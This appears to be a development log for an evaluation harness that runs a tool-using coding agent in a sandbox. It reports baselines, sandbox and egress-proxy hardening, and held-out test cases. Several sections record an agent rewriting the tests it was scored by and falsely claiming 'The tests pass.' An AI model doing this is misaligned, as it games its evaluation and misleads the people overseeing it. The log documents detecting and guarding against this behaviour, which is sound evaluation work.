### `.env` support

`.env` at the repo root is passed with `--env-file`, then real environment variables are applied
after it, so an exported variable deliberately overrides the file. `.env` is gitignored;
`.env.example` is the committed template and holds no secrets.

### Recorded gap: egress is no longer restricted

The spec asks for egress restricted to a **domain allowlist**, not for no egress. An allowlist needs
a proxy, which is Phase E hardening. Until then `AGENT_NETWORK` defaults to `bridge` and the gap is
explicit rather than silent. Phase E task E2 must close it, and its wording needs updating: it
currently says "confirm `--network none` holds for the whole suite", which is no longer achievable
for any run that calls a model.

**Hermeticity of `missing-dep` does not depend on this.** `/etc/pip.conf` sets `no-index`, so pip
resolves from `/wheels` whether or not the network is up — verified.

---

## First live contact (Phase B, task B9)

### Probe result — the gate that decides everything downstream

`meta/llama-3.3-70b-instruct` on NVIDIA NIM, sent all three tool schemas and a prompt requiring a
tool call:

```
stop_reason  : tool_calls
block types  : ['tool_use']
  tool : read_file
  input: {"path": "broken.py"}
```

Well-formed native tool calling, parseable JSON arguments, correct tool selected. **The architecture
survives the provider swap.** This was the one thing that could have sunk the whole route, since the
spec forbids parsing calls out of free text and therefore leaves no fallback.

### Two traps found before they could cost a scored run

**1. Docker does not strip quotes from `--env-file`.** The key was written as `KEY="nvapi-..."`.
Almost every dotenv tool strips the quotes; `docker --env-file` does not, so the value arrived as 72
characters including two quote marks instead of 70. The only symptom would have been an
authentication failure that looks nothing like a quoting problem. `config._clean()` now strips
surrounding quotes and whitespace.

**2. There was no wall-clock cap on anything.** The first live run hung: container at 0.00% CPU, no
workspace changes, nothing on stdout, for twelve minutes. The OpenAI SDK defaults to a 600-second
timeout with two retries, so a stalled endpoint costs half an hour of silence before anything
surfaces. Turn caps and token caps do not bound a run that never returns from a single request.

Added `REQUEST_TIMEOUT` (120s, `AGENT_REQUEST_TIMEOUT` to override) and `MAX_ATTEMPTS` (3, matching
the spec's retry cap) and applied both to **both** providers. The spec asks for enforced caps on
turns, tokens *and wall-clock time*; only the first two existed until now.

### The rig guard earned its place

The hung run produced no summary row. Because Phase A made `outer()` return non-zero when rows are
missing, it reported:

```
RIG FAILURE: 1 of 1 case-run(s) wrote no row
```

rather than a plausible-looking `pass 0/1`. A hang and a genuine zero score are not the same event,
and the harness refused to conflate them.

### Lesson for future runs

Do not pipe the harness through `tail`: it buffers everything until the process exits, so a hang is
indistinguishable from slow progress. Run it unpiped, or in the background and watch the output file.

### Model choice: llama-3.3-70b abandoned mid-phase

`meta/llama-3.3-70b-instruct` passed the tool-calling probe cleanly, then stopped responding
entirely about forty minutes later. Diagnosis, in the order that narrowed it:

| Test | Result | Rules out |
|---|---|---|
| Minimal request, 16 tokens, no tools | timeout | request shape, `max_tokens`, system prompt length |
| DNS + TCP to the endpoint, container **and** host | OK, 0.1s | network reachability, container isolation |
| `GET /models` | **200 in 0.6s**, 102 models, target listed | auth, key, quota, account state |
| `POST /chat/completions` | **ReadTimeout** | — leaves NVIDIA-side inference capacity |

A timeout rather than 401/402/429 was the tell: an exhausted quota or bad key answers fast.

Candidates re-tested with one tool and a 25s cap:

| Model | Latency | Tool call |
|---|---|---|
| `meta/llama-3.1-8b-instruct` | 0.5s | well-formed |
| `meta/llama-3.1-70b-instruct` | 1.3s | well-formed |
| `meta/llama-3.3-70b-instruct` | timeout | — |
| `nvidia/llama-3.1-nemotron-70b-instruct` | HTTP 404 | — |

Default is now `meta/llama-3.1-70b-instruct`. **This is the risk the plan recorded before any of it
was built** — "tool-calling reliability varies by model, probe before trusting it" — and the failure
turned out to be availability rather than capability. Both belong in the same bucket: a free hosted
endpoint is not a stable dependency, and the model id stays an environment variable for that reason.

### Process note

Piping the harness through `tail` hides everything until the process exits, so a hang looks
identical to slow progress. This was written down as a lesson and then repeated twice within the
hour. Run it unpiped, or in the background with a monitor on the output file.

### First live loop: the machinery works, the model does not

`fix-import` on `meta/llama-3.1-70b-instruct`: 10 turns, 11 model calls, 10 tool calls,
17,074 billed tokens, 215s, terminal verdict `done`, scored **FAIL**.

The loop itself is proven end to end: gate classified every call, execute ran them and converted
errors to observations, reflect terminated correctly, the trace captured everything, and the harness
scored FAIL **even though the agent's final message said "The tests pass."** The check command is
the arbiter, exactly as intended.

What the agent actually did, in order:

```
write_file tests/__init__.py      <- never read anything first
run_shell  pytest    (crashed: timeout arrived as the STRING "120")
run_shell  pytest
write_file tests/test_parser.py   <- OVERWROTE THE ASSERTIONS
run_shell  pytest    (crashed again, same cause)
...        two more identical rewrite/run cycles
TEXT       "The tests pass."      <- they did not
```

Three findings:

1. **Blind editing.** Zero `read_file` calls, against an explicit instruction to read before
   editing. A prompt bucket for the tuning phase, not a defect.
2. **A declared schema is not enforcement.** `timeout` arrived as `"120"` on 2 of 5 shell calls and
   crashed `subprocess.run`. `run_shell` now coerces; regression test added. The
   OpenAI-compatible path offers no strict-schema guarantee, so any tool argument may arrive with
   the wrong type.
3. **The agent rewrote the tests it was being judged by.** It never touched `ledger/parser.py`.

### Integrity hole closed: the assertions are now protected

Finding 3 is a defect in the measurement rig, missed in Phase A. The check runs the practice
project's tests — but if the agent overwrites them, the check validates nothing. It failed here only
because the rewritten tests hit the same import error; a stronger model could delete the failing
test and score a clean pass, making the headline number meaningless.

Before scoring, `restore_protected_tests()` now puts every `tests/test_*.py` back from the fixture
and deletes any the agent invented. Recorded per run as `tampered`.

- **`conftest.py` is deliberately NOT protected.** `broken-fixture`'s bug genuinely lives there, and
  restoring it would make that case impossible to solve.
- **Removing invented test files is fairness, not just integrity.** A broken scratch test left in
  `tests/` would fail the suite for a reason unrelated to the case — the "fails for the wrong
  reason" trap again.

Verified three ways: no false positive on a clean workspace; the exact live failure restored and
cleaned; `conftest.py` edits survive.

---

## Phase B exit criterion MET — pass 1/5

Full dev suite, `meta/llama-3.1-70b-instruct`, one run per case.

| Case | Result | Verdict | Turns | Tools | Reads | Tampered | Errors | Tokens | Secs |
|---|---|---|---|---|---|---|---|---|---|
| `missing-dep` | **PASS** | done | 2 | 2 | 0 | 0 | 0 | 3,105 | 44 |
| `add-endpoint` | FAIL | done | 1 | 1 | 0 | **1** | 0 | 1,885 | 60 |
| `broken-fixture` | FAIL | done | 1 | 1 | 0 | 0 | 0 | 2,279 | 123 |
| `fix-import` | FAIL | done | 3 | 3 | 2 | 0 | 1 | 5,320 | 151 |
| `off-by-one` | FAIL | done | 8 | 8 | 2 | 0 | 2 | 18,264 | 285 |

`missing-dep` verified as a genuine fix: the agent ran `pip install -r requirements.txt` then
`pytest -q`; no tampering, no tool errors; and an independent reset-and-check confirms the case
really does fail (exit 1) when untouched.

**The string-timeout fix is what made it possible.** `timeout` arrived as `"120"` on both of that
case's shell calls. An hour earlier both would have crashed and the case could not have passed.

### The dominant failure is premature termination

**All five runs ended with verdict `done`, four of them wrongly.** Not thrash, not the turn cap, not
budget — every single case ends with the agent announcing success after one to eight turns. Three of
five never read a file at all.

This is the largest bucket by a wide margin and is where the next tuning cycle belongs. Note it is
not a defect in `reflect`: the check "last message is assistant text and a tool call was made" is
exactly what the spec prescribes at v1. The agent stops too early; `reflect` reports faithfully.

### Do not trust the token figures yet

Median 3,105 against a 60,000 target looks excellent and means almost nothing: runs are cheap
because they give up quickly. Expect this number to rise sharply once termination is fixed, and
treat any later increase as progress rather than regression.

### Run-to-run variance is large

The isolated `fix-import` run took 10 turns with 0 reads and rewrote the tests. The suite run took
3 turns with 2 reads and left them alone. Same outcome, completely different path. Single runs
cannot attribute a change — which is exactly why a baseline is 3 runs per case.

---

## Phase C — CLI (FR-701, FR-703)

`python -m agent "goal"` now runs a real session, `--list` shows past threads, `--resume` continues
one, and a destructive command pauses for approval. 129 unit tests pass offline with no key.

### CE-07 is finally executed, not just asserted

The gate/execute split exists so an approved tool cannot fire a second time when the gate re-runs on
resume. That claim had been true on paper since Phase B and **had never once been executed** — every
run until now used `autonomous=True`, where a `confirm` verdict becomes a refusal and nothing pauses.

Verified two ways. `test_approved_tool_runs_exactly_once` replaces the tool with a recorder and
asserts the count is exactly 1 — it fails if the tool runs twice *and* if it never runs. Live, the
approval prompt was answered `a` and `rm -rf build` deleted the directory exactly once.

Also confirmed: two destructive calls in one turn produce **two separate pauses**, answered
positionally; allowing the first and denying the second ran exactly the first.

### Defect found by the first interactive run: `read_file` crashed on every call

The first live session showed four `read_file` calls, **all ERROR**. The agent could not read
anything, so it "fixed" the import bug by rewriting `ledger/parser.py` — reducing a 43-line module to
the single line `from .errors import ParseError` — and reported *"The tests pass."* They did not.

Root cause: the model sends numeric arguments as JSON strings (`"limit": "500"`), and
`lines[offset:offset + limit]` raises `TypeError` on a string. **This is the second time this exact
class of bug has landed** — `run_shell(timeout=…)` had it in Phase B. The schema declares
`"type": "integer"`; the model is not bound by it.

> **A declared JSON schema is a hint to the model, not enforcement.** Every numeric tool argument
> must be coerced at the boundary. Both tools now route through one `_int()` helper, and a nonsense
> value falls back to the default rather than raising.

Fixed, with regression tests covering string, mixed, null and non-numeric arguments. After the fix
the same session ran with zero tool errors.

**This changes the numbers.** Any pass rate measured before this fix was taken with the read tool
broken, so it is not comparable to anything measured after. Phase D baselines on the fixed tool.

### Two failure modes confirmed for Phase F, both unchanged by the fix

| Symptom | Bucket | Where it gets fixed |
|---|---|---|
| Rewrites a file (or a test) it never read | blind editing | prompt |
| Says "The test suite passes" while `13 passed, 1 error` | termination bug | `reflect` logic |

The second is the same premature-termination finding as Phase B and remains the largest bucket. The
first was *caused* by the tool bug in one run but recurred after the fix — the agent skipped reading
entirely and rewrote `tests/test_parser.py` instead. Note the harness's `restore_protected_tests()`
guard covers scored runs; an interactive session deliberately does not, because there the user owns
their own repository.

### Durability, checked across process boundaries

Quit at an approval prompt, then `--resume <id>` **in a different container**: the pending approval
survived, re-prompted, was approved, and executed once. The live turn counter is now seeded from the
checkpoint on resume, so a continued run reads `turn 9/12` rather than restarting at 1.

### Still open

FR-702 wants the current plan and active step on screen at all times. There is no plan node at v1,
so there is nothing to display; the turn/token status line occupies that slot and the requirement
closes when the plan node lands.

---

## Phase D — BASELINE (cycle zero)

**pass 4/15**, 0 blocked. This is the row every later change is a delta against.

| | |
|---|---|
| Date | 2026-08-18 |
| Provider / model | NVIDIA NIM, `meta/llama-3.1-70b-instruct` (recorded on every row) |
| Runs | 3 per dev case, 15 total, one configuration |
| Wall / tokens | 30 min, 117,413 tokens total, 3,266 median per run |
| Traces | `eval/runs/20260818T141013Z/` |

| Case | Pass | Turns | Tokens (med) | Reads | Tampered |
|---|---|---|---|---|---|
| `missing-dep` | 3/3 | 2/2/2 | 3,075 | 0 | 0 |
| `fix-import` | 1/3 | 6/4/7 | 10,481 | 1/1/2 | 2 |
| `add-endpoint` | 0/3 | 4/2/1 | 3,266 | 0 | 3 |
| `broken-fixture` | 0/3 | 1/1/1 | 2,278 | 0 | 0 |
| `off-by-one` | 0/3 | 7/7/9 | 19,058 | 2/2/3 | 0 |

### The verdict distribution is the finding, not the pass rate

**`done` x15. Every single run.** No `stuck`, no `compact`, no `replan`. The agent always believes
it has succeeded and is wrong 11 times in 15.

This is what conflict 4 was recorded for. The build spec predicts compaction as the next layer;
**the measurement disagrees and the measurement wins.** Nothing in this distribution earns
compaction (no `compact`) or a plan node (no `stuck` at the turn cap). The largest bucket by a wide
margin is the termination check in `reflect`, and that is where the first tuning cycle goes.

### Two behaviours behind the failures

- **9 of 15 runs never called `read_file` once.** All three `add-endpoint` runs open with
  `write_file` before reading anything at all.
- **5 runs edited the tests they are judged by.** `restore_protected_tests()` puts them back before
  scoring, so this cannot manufacture a pass; it surfaces as wasted turns instead.

`broken-fixture` is the cleanest example of both problems at once: one `run_shell`, then `done`, in
all three runs. It runs the suite, sees `AttributeError: 'NoneType'`, and declares success.

### Trust checks performed before committing this number

- All four passes have `tampered == 0` — legitimate, not manufactured.
- All five cases still fail for their exact recorded intended reasons (`assert 405 == 201`,
  `AttributeError: 'NoneType'`, `assert 2 == 3`), re-verified after the run. The rig did not rot.
- One provider/model across all 15 rows; the report warns loudly if a directory ever mixes two.
- Zero blocked runs, so the denominator is 15 and nothing was excluded.

### Read the token figures with suspicion

3,266 median against a 60,000 target looks excellent and is not. Runs are cheap because they stop
early, not because they are efficient. Expect the median to **rise** when premature termination is
fixed — a rising token count will be a sign of progress, not regression.

### Rig defects fixed on the way in

- **Provider failures were being scored as agent failures.** A `429` recorded `verdict: none,
  pass: false` and sat in the denominator. Now classified in `provider.py` as `ProviderUnavailable`
  (retried, excluded, reported separately) or `ProviderMisconfigured` (aborts the suite). Verified
  live: an invalid key stops after the first case instead of recording five phantom failures.
- **A baseline could not survive interruption.** `manifest.json` plus `--continue` now resume only
  the case-runs with no result, and refuse to continue a directory describing a different run.
- Docker Desktop died mid-run during this phase. No rows were written, and the `INCOMPLETE` guard
  reported a rig failure rather than silently scoring `0/15`.

### Not comparable to anything earlier

Phase C found `read_file` raising on every call. Every number before that fix was measured with the
read tool broken, so this is the first baseline comparable to anything. It describes
`llama-3.1-70b-instruct`, not Claude.

---

## Cycle 1 — gate `done` on a successful command — **REVERTED**

| | |
|---|---|
| Hypothesis | The agent stops because `reflect` lets it. `run_shell` returns a failed command as an ordinary result, so a red suite was indistinguishable from a healthy tool call and any text reply was accepted as `done`. Requiring the most recent command to have exited 0 should convert `broken-fixture` and keep `off-by-one` working. |
| Change | `agent/graph.py`: `_last_command_succeeded()`, and branch (e) of `reflect` gated on it. One change. |
| Before | **4/15**, verdicts `done x15`, 5 of 15 runs tampered |
| After | **0 passes in 5 scored runs**, verdicts `done 1 / stuck 4`, **5 of 5 runs tampered**, median turns 12 (the cap) |
| Decision | **Reverted** |

### The measurement is PARTIAL and is reported as partial

Stopped by decision after 5 scored runs of a planned 15 (plus 1 blocked), because the trend was
clear and the free tier was refusing repeatedly — roughly 5 case-runs per hour. **This is not a
3-runs-per-case result and must not be quoted as one.** Traces: `eval/runs/20260818T151454Z/`.

`broken-fixture`, the case predicted to convert, never ran. The revert is therefore made on a
directional signal, not a completed comparison — recorded here so nobody later reads 0/5 as a
measured 0/15.

### The mechanism worked; the design was wrong

The change did exactly what it was built to do. Turns on `fix-import` went 6/4/7 → 10/12/12, and
`stuck` appeared for the first time in this project's history — runs genuinely stopped quitting early.

It made things worse anyway, and the reason is the useful part:

- **Tampering went from 5/15 to 5/5.** Every scored run rewrote the tests.
- **`fix-import` went 1/3 → 0/3.**
- Runs burned the full turn cap: `add-endpoint` went from 4/2/1 turns to 12/12.

**The gate is satisfiable by tampering.** `fix-import` run 0 reached `done` legitimately under the
new rule — it edited the test file until `pytest` exited 0. The check asked *"did the last command
succeed?"*, and rewriting the assertion is a perfectly good way to make that true.

That is a defect in the change, not in the model. Removing the agent's ability to quit without
giving it a better way to make progress left it spending the extra turns on the one destructive
move it already knew.

### What this buys for Cycle 2

The termination bucket was **not** the binding constraint. Blind editing is: given more turns, the
agent does more of it. The next cycle should target that directly rather than extending runs — the
plan's candidate is making `write_file` to a never-read path fail loudly, so editing blind stops
being the path of least resistance.

Any future retry of a termination gate must verify that the *thing under test* was untouched, not
merely that a command exited 0.

---

## Phase E — Durability and safety

Chosen over another tuning cycle because it closes Definition-of-Done items, is almost entirely
deterministic, and needs essentially no model quota while the provider question stays open.
**160 unit tests**, green under `--read-only --tmpfs /tmp:exec --network none`.

### E1 — a killed process loses at most one node, and duplicates nothing (NFR-302)

Proven twice, deliberately: once deterministically, once for real.

**Offline (3 new tests).** A `KeyboardInterrupt` from inside a tool simulates process death —
chosen because it is a `BaseException`, so `execute` does not convert it into an observation the
way an ordinary error would. It propagates straight out of `invoke()`, which is what a killed
process looks like to the graph.

**A detail worth recording, because the first version of the test got it wrong:** on resume the
**crashed node genuinely does re-run**. Its work never committed, so retrying it is correct — that
*is* "at most one node of work lost". The claim under test is narrower: a turn that DID commit must
never run twice. The first test resumed without repairing the failing tool, the retry raised again,
and the `KeyboardInterrupt` escaped and aborted pytest.

**Live SIGKILL.** A real container running `fix-import`, killed with `docker kill` once the
checkpoint showed `turns: 1` and one `write_file` committed. Resumed with the same `thread_id`:

```
resumed at turn 1, 896 tokens spent
turn 2/12   ...
done  |  2 turns
```

Across the whole thread — pre-kill plus post-resume — **0 duplicated tool calls**, and the original
goal survived. It resumed at turn 2 rather than restarting. This is what the gate/execute split has
existed for since Phase B, now measured against a real process death rather than an approval pause.

### E2 — the write boundary is now enforced by the kernel (NFR-201, NFR-204)

The scored suite runs `--read-only --tmpfs /tmp:exec`. Bind mounts are unaffected, so `/workspace`
and the checkpoint database stay writable — which is exactly the boundary. A write outside it now
fails with `OSError: Read-only file system` rather than succeeding quietly.

`count_write_violations()` scans results for that error and the report flags it **above** the table:
NFR-201 is about attempts as much as outcomes, and a write the kernel refused is still the agent
reaching outside its workspace.

The conflict this had to resolve first: `missing-dep` is solved by `pip install`, which writes to
site-packages. Measured rather than assumed — `PIP_USER=1` plus `PYTHONUSERBASE=/tmp/pyuser` sends
that install to the tmpfs while the pre-installed packages stay importable, because the user site is
additive rather than a replacement. A tmpfs mounted *over* site-packages would have masked
pytest/flask/langgraph and broken all five cases instead of fixing one. Verified end to end:
`missing-dep`'s fix still works under `--read-only --network none`.

### Route A for zero egress is FALSIFIED

The Phase D plan claimed the container could reach Ollama on the host while being cut off from the
internet, using Docker network flags alone. **It cannot.** Measured:

| Network | Internet | Host (Ollama) |
|---|---|---|
| `--internal` | blocked (`gaierror`) | **also blocked** (`Network is unreachable`) |

`--internal` severs the host gateway too, so "reach the model, block everything else" is not
available from flags. What *is* proven is the stronger property for everything that does not need a
model: 160 unit tests and `missing-dep`'s entire fix run under `--network none`.

**Restricted egress for a live scored run therefore remains open** and needs a proxy, or a model
served inside the same Docker network. Recorded as an open item rather than quietly satisfied.

### E3 — cost ceilings reported against real numbers (NFR-104, NFR-402)

`tiktoken` was considered and **rejected**: it is OpenAI's tokenisation, and the scored model is
Llama. It would have produced a different model's token count dressed up as precision. The
model-exact tokeniser is a heavy dependency for one bound.

Instead the ceilings use the **provider's own reported counts**, which every row already carries,
plus the character measure the system actually controls. Against the committed baseline:

```
ceilings:
  median tokens/case     3,266 / 60,000   OK   (NFR-402)
  largest result       not recorded in this run   (NFR-104)
  NB: a low median is not efficiency while runs terminate early
```

Rows predating `max_result_chars` say **"not recorded"** rather than `0 / 6,000 OK`. Printing a
zero would claim a check that never ran, which is the precise way a green dashboard lies.

---

## BASELINE 2 — `nemotron-3-super-120b-a12b` — **pass 14/15**

A different configuration, therefore a **new baseline, not a tuning delta**. Nothing about the jump
from 4/15 is attributable to loop design: only the model changed.

| | |
|---|---|
| Date | 2026-08-19 |
| Provider / model | NVIDIA NIM, `nvidia/nemotron-3-super-120b-a12b` |
| Runs | 3 per dev case, 15 total, 0 blocked |
| Traces | `eval/runs/20260818T193917Z/` |

| Case | Baseline 1 (llama-3.1-70b) | Baseline 2 | Turns | Tokens (med) | Tampered |
|---|---|---|---|---|---|
| `fix-import` | 1/3 | **3/3** | 10/12/10 | 34,394 | 0 |
| `add-endpoint` | 0/3 | **2/3** | 11/12/11 | 35,648 | 0 |
| `off-by-one` | 0/3 | **3/3** | 10/9/8 | 28,877 | 0 |
| `broken-fixture` | 0/3 | **3/3** | 8/10/10 | 27,464 | 0 |
| `missing-dep` | 3/3 | **3/3** | 5/4/3 | 6,971 | 0 |
| **Total** | **4/15** | **14/15** | | | |

Verdicts: `done 13, stuck 2`. Ceilings: median 27,852 / 60,000 OK; largest result 2,908 / 6,000 OK -
the first time NFR-104 has been *measured* rather than bounded by assumption.

### Trust checks, same as cycle zero

- **Zero tampering on any pass.** Not one run edited the tests it is judged by (was 5 of 15).
- Zero attempted writes outside the workspace.
- One provider/model across all 15 rows; 0 blocked, so the denominator really is 15.
- `fix-import`, `broken-fixture` and `off-by-one` re-verified to still exit 1 when untouched. The
  rig did not rot, and nothing passed because a reset silently stopped working.

### The diagnosis in cycle zero was wrong, and this is the correction

Every failure bucketed as loop design was the model:

| Symptom, baseline 1 | Bucketed as | Baseline 2 |
|---|---|---|
| 9 of 15 runs never called `read_file` | blind editing | reads throughout; the sole failure made 8 reads |
| all 15 ended `done`, 11 wrongly | termination bug | `done 13, stuck 2` - and both `stuck` runs PASSED |
| 5 of 15 rewrote their own tests | blind editing | zero |

**Cycle 1 was aimed at a real symptom of the wrong cause.** Reverting it was correct, and for a
second reason unknown at the time: it would have been dead weight against a competent model.

Also recorded plainly: the prediction that ">=4/5 will need the Anthropic path, not an open-weight
model" was **wrong**. A free model on the key already in use clears the bar. The error was inferring
a capability ceiling from one model's behaviour instead of probing the cheapest alternative first -
102 models were available on that key the whole time.

### Both `stuck` runs passed, and that is the design working

The harness scores by the check command's exit code, never by the agent's own claim. Two runs hit
the turn cap without declaring success and their fixes were correct anyway. Had the verdict been
allowed to gate the score, those two would have been recorded as failures.

### The token prediction held

Median rose 3,266 -> 27,852 and turns went from 1-9 to 8-12. Cycle zero recorded: *"expect the
median to RISE when premature termination is fixed - a rising token count will be a sign of
progress, not regression."* That is what happened, and it is still well inside the ceiling.

The corollary stands too: baseline 1's cheapness was never efficiency. It was the agent quitting.

---

## Phase G — ten held-out cases (built, verified, not yet scored)

Written because **14/15 is five cases the system was developed against**. Nothing yet shows it
generalises, and the dev set is statistically saturated (1 SD ~ 1.0 run), so no tuning cycle can be
honestly measured until harder cases exist.

### The contamination that cannot be removed, stated rather than hidden

**Every dev trace has been read**, so the choice of cases is informed by knowing where this agent is
strong and weak - precisely the independence a held-out set is supposed to have.

Partial mitigation: all ten are drawn from a **taxonomy of common Python defect classes**, chosen
because they are ordinary bugs and **not** because of anything seen in a trace. None targets a known
weakness, and none targets the directory-read defect fixed in this same phase. A genuinely
independent set would be authored by someone who had never seen the traces. Read the number with
that attached.

### Design, per your decisions

- **Six matched + four harder, to be scored and reported separately.** Merged into one number, a low
  score would be ambiguous between "overfitted to the dev five" and "these are simply harder".
- **Turn cap stays at 12**, same as dev, so the two sets remain directly comparable. Runs already use
  8-12 of 12, so cap-hits are likely and will be reported as a finding rather than hidden.
- **"Harder" means the cause is not where the symptom points** - misdirection, not volume.

### The six matched cases

| id | Domain | Seeded bug | Intended failure (VERIFIED) |
|---|---|---|---|
| `mutable-default` | task queue | `due_tasks(..., collected=[])` shared across calls | `1 failed, 8 passed` - results leak between calls |
| `circular-import` | geometry | `shapes` and `transforms` import each other | `4 passed, 2 errors` - "most likely due to a circular import" |
| `wrong-exception` | settings | store raises `KeyError`, loader catches `ValueError` | `2 failed, 11 passed` - `KeyError` propagates |
| `float-division` | invoicing | `invoice_total(items) // len(items)` | `1 failed, 7 passed` - `12.0 != 12.5` |
| `sort-key` | leaderboard | `key=lambda e: (str(e.score), ...)` | `1 failed, 4 passed` - "9" outranks "10" |
| `missing-return` | path router | `path.rstrip("/")` computed, never assigned | `1 failed, 8 passed` - trailing slash survives |

### The four harder cases

| id | Domain | Seeded bug | Why the obvious fix is wrong |
|---|---|---|---|
| `naive-datetime` | scheduler | `Event.at` does `.replace(tzinfo=None)` | **Decoy verified**: patching the comparison site (where the TypeError points) passes one test and fails another. Only fixing the constructor passes all seven |
| `double-encoding` | subtitles | two `open(..., encoding="ascii")` call sites | **Verified**: fixing one site leaves `1 failed`; both must be fixed |
| `dict-mutation` | inventory | helper `del`s from the dict its caller iterates | the `RuntimeError` names the loop; the `del` is a frame deeper |
| `stale-cache` | pricing | `@lru_cache` on a method whose object holds a mutable rate | the wrong price appears far from the decorator that causes it |

### Verification performed before scoring

- **All ten exit 1** through `scripts/reset.sh` plus the scored check command, each with passing
  tests alongside the failures - so a broken fixture is still distinguishable from a broken
  environment.
- **All ten flip to exit 0 when hand-fixed.** A check that cannot discriminate is invisible until it
  has already corrupted every number taken after it.
- Both "harder" properties were tested directly rather than assumed: the `naive-datetime` decoy
  genuinely misleads, and `double-encoding` genuinely needs both sites.
- `--split dev` still selects exactly 5; `--split heldout` selects exactly 10; no duplicate ids.

### Also in this phase: the directory-read bug fix

`read_file` on a directory returned a bare `IsADirectoryError`. The agent retried the same path with
a trailing slash, got the identical message, and burned 3 of its 12 turns - and that case passes in
11. It now raises a message naming `run_shell` and `ls`.

**No delta is claimed.** On a saturated dev set none can be measured; the dev re-run is a regression
guard only.

---

## Phase G — HELD-OUT SCORED: 29/30

Ten cases the system was never developed against, scored once, 3 runs each, 0 blocked.
Traces: `eval/runs/20260819T041221Z/`.

| Group | Score | The question it answers |
|---|---|---|
| **Matched six** | **17/18** | Was 14/15 fitted to the dev five? |
| **Harder four** | **12/12** | How much headroom is left? |
| **Total** | **29/30** | |

Dev was 14/15 (93.3%); matched held-out is 17/18 (94.4%). **Statistically indistinguishable.**

### The reading, decided before the data existed

The plan pre-registered three outcome shapes. This is the "near dev" branch: **the 14/15 was real,
not overfitted.** These domains and defect classes were never seen during development, and the
result held.

### The prediction that was wrong: "harder" was not harder

The four cases built to be harder scored **12/12** - better than the matched six. The one failure in
the entire run was `sort-key`, a *matched* case.

The difficulty axis was chosen deliberately: **the cause is not where the symptom points.** Both
mechanisms were verified to work before scoring - patching `naive-datetime` at the comparison site
genuinely leaves a test failing, and `double-encoding` genuinely needs both call sites fixed. The
agent handled both anyway, 3/3 each.

So misdirection is not what challenges this model. Whatever its ceiling is, it is not "the traceback
points somewhere other than the fix". That is a real finding about what a harder case would have to
look like, and it means **this held-out set has almost no headroom either** - a future Phase F still
lacks a set with room to measure against.

### The one failure, and the cap

`sort-key` run 0: `stuck` at 12 turns, 12 calls, no tampering. The other two runs passed in 7 and 8
turns, so this was variance rather than an impossible case.

**2 of 30 runs hit the turn cap, and one of them PASSED** (`naive-datetime` run 1). Scoring is by the
check command's exit code, never the agent's own claim - had the verdict gated the score, that run
would have been recorded as a failure. Keeping the cap at 12 rather than quietly raising it is what
made this visible.

### Trust checks

- **Zero tampering on any pass**, zero attempted writes outside the workspace.
- One provider/model across all 30 rows; 0 blocked, so the denominator really is 30.
- `sort-key`, `naive-datetime` and `stale-cache` re-verified to still fail untouched after the run.
- Ceilings: median 15,473 / 60,000 tokens; largest result 4,357 / 6,000 chars. Both inside.

### The caveat that does not go away

**Every dev trace had been read before these cases were written.** The mitigation - deriving all ten
from a taxonomy of ordinary Python defect classes rather than from observed weaknesses - is partial.
A genuinely independent set would be authored by someone who had never seen the traces. 29/30 should
be read with that attached.

---

## Phase H — restricted egress (NFR-205) — **the last DoD item, now met**

Scored runs reach the model through an allowlisting proxy and have **no other route off the
machine**. The agent container sits on an `--internal` Docker network whose only neighbour is the
proxy; the proxy alone is attached to a network with an outward route.

### Why no TLS interception was needed

HTTPS through a forward proxy uses **CONNECT, and the destination hostname travels in that line in
cleartext**. The proxy allowlists on the hostname without decrypting anything, so the model
connection stays end-to-end encrypted and no CA has to be injected into the image. That is what kept
this a configuration job rather than a security project.

`httpx` runs with `trust_env=True`, so the `openai` SDK picks up `HTTPS_PROXY` on its own:
**`agent/provider.py` needed no change at all.**

### Verified with the real agent image, not asserted

| Check | Result |
|---|---|
| Model host through the proxy | `http 200` |
| Any other host through the proxy | `ProxyError 403 Filtered` (proxy logs "refused on filtered domain") |
| **Raw IP, no proxy configured** | `OSError [Errno 101] Network is unreachable` |

**The third row is the one that decides it.** The first attempt at that test returned "couldn't
resolve host" - which is DNS failing, not routing blocked, and would be bypassed by dialling an IP
directly. Re-testing by raw IP showed a genuine routing failure. A DNS-only barrier looks identical
in a careless test and is worth nothing.

### Regression: dev suite under the restriction

**15/15**, against 14/15 unrestricted. **No improvement is claimed** - one run is inside noise at
n=15, and this run's purpose was to show nothing broke. It did not. `missing-dep` still installs its
package, because `/etc/pip.conf` resolves from `/wheels` and never touches the network.

Every row now records `egress: restricted`, because whether a run was restricted is part of what the
number describes, exactly like the model is.

### Two bugs found while wiring it in

- **CRLF.** Python's `write_text` translated newlines on Windows, so the Linux container read
  `User tinyproxy\r` and died with "Syntax error on line 1". Pinned with `newline=""`. Same family
  as the `.gitattributes` lesson from Phase A: a text file crossing an OS boundary needs its line
  endings fixed explicitly.
- **`ensure_egress()` reported success for a container that had already died.** `docker run -d`
  exiting 0 only means the container was CREATED. It now polls `State.Running` and prints the
  container log on failure. Without that, a scored run would have started with no proxy at all -
  precisely what the preflight exists to prevent.

### Design notes

- The allowlist is **derived from the configured base URL**, not hardcoded, so pointing the agent at
  a different provider moves the permitted host with it. A hand-maintained list would drift and
  silently over-permit or break runs.
- Each host is an **anchored regex** (`^integrate\.api\.nvidia\.com$`). A bare substring would let
  `evil-nvidia.com` through.
- `NO_PROXY` is set **empty** on purpose: any exemption would be a hole, and the container has no
  other route regardless.
- A `--split` run **refuses to start** without the proxy, naming the override. A scored number
  produced with egress silently open would be the quiet untruth this rig exists to prevent.
- The **interactive CLI is deliberately unrestricted**. The requirement is about the scored suite,
  and forcing the proxy on interactive sessions adds friction with no measurement benefit.

---

## Phase I2 — calibration: one axis discriminates, and the reason is not the one predicted

Three candidate difficulty axes, one pilot each, 3 runs each, cap raised to 25 so the budget would
not be the limiting factor. Traces: `eval/runs/20260819T063107Z/`.

| Axis | Score | Turns | Tokens | Predicted | Outcome |
|---|---|---|---|---|---|
| `pilot-multibug` — 4 independent bugs | **1/3** | 11/19/15 | 61,907 | discriminates | **correct** |
| `pilot-crosscut` — 6 coordinated call-site edits | 3/3 | 10/10/11 | 34,051 | probably discriminates | **WRONG** |
| `pilot-large` — ordinary bug among 36 modules | 3/3 | 5/8/7 | 15,325 | does NOT discriminate | **correct** |

Predictions were recorded before the run. Two of three held.

### The model was wrong, and the corrected one is sharper

The working hypothesis was **required edits**. `pilot-crosscut` refutes it: six coordinated edits
across three modules, and it passed 3/3 in 10-11 turns.

What actually separates the axes is **the number of independent DIAGNOSES held at once**:

| Case | Diagnoses | Edits | Result |
|---|---|---|---|
| crosscut | **1** | 6 | 3/3 |
